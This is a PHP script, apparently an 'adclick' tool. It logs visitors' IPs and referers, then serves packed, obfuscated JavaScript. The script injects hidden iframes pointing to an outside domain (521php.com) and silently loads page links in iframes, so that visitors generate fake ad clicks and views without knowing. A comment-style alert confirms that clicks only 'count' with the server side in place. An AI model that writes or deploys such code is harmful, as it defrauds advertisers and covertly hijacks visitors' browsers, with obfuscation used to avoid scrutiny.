<?php
define('JP_LOG_OPEN',true);
define('JP_LOG_DIR','/data/log/adclick/');
//获取客户端IP
function getRemoteIp()
{
	return isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'])?$_SERVER['HTTP_X_CLUSTER_CLIENT_IP']:$_SERVER['REMOTE_ADDR'];
}
function write_log($type="",$content="",$d=''){
	if(!JP_LOG_OPEN) return FALSE;
    $time = time();
    $date = date('Y-m-d H:i:s',$time);
    $logdir = 'adclick_'.date("Ymd",$time);
    if($d){
        $dir = $d.date('Y-m',$time);
    }else{
        $dir=JP_LOG_DIR.date('Y-m',$time);
    }
    if(!is_dir($dir)){
        if(!mkdir($dir)){
            return false;
        }
    }
    $filename=$dir.DIRECTORY_SEPARATOR.$logdir.'.log';
    $message ='';
    if ( ! $fp = @fopen($filename, 'ab'))
    {
        return FALSE;
    }
    $message .= '['.$date.']-['.getRemoteIp().']-['.$type."] --> $content\n";
    flock($fp, LOCK_EX|LOCK_NB);
    fwrite($fp, $message);
    flock($fp, LOCK_UN);
    fclose($fp);
    return true;
}
	$u = $_SERVER['HTTP_REFERER'];
	if($u){
		$g_url =  "http://".$_SERVER['HTTP_HOST'].'/';
		if($g_url){
		write_log('HTTP_REFERER',$u);
?>
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(36)};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[2-9b-y]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('c d(e,j){3 k=j-e;3 l=m.random();return(e+m.round(l*k))}3 n=d(1,10);3 f=\'\';7(_v>=n){setTimeout(\'o()\',1000)}p{3 q=d(1,g);f+=\'<r style="display:none"><4 5="8://s.t.u/index_\'+q+\'.9"></4></r>\';document.write(f)}$(c(){$("#_cnzz").9("");7(h==($("script[5*=\'8://s.t.u/i/adclick.i\']").b(\'5\'))){alert("亲，此i文件只可以远程使用奥,此功能需要服务端脚本配合才可以让点击有效")}});c o(){3 2=$("a").eq(0).b("6");2=$("a[6*=8]").b("6");7(2!=h&&2!=""){$("#v").9(\'<4 w="g%" x="y" 5="\'+2+\'"></4>\')}p{3 2=$("4").contents().find("a[6*=8]").b("6");7(2!=h&&2!=""){$("#v").9(\'<4 w="g%" x="y" 5="\'+2+\'"></4>\')}}}',[],35,'||_href|var|iframe|src|href|if|http|html||attr|function|GetRandomNum|Min|_html|100|undefined|js|Max|Range|Rand|Math|_num2|clearWord|else|_n|div|www|521php|com|show_iframe|width|height|800'.split('|'),0,{}))
<?php
		}
	}
?>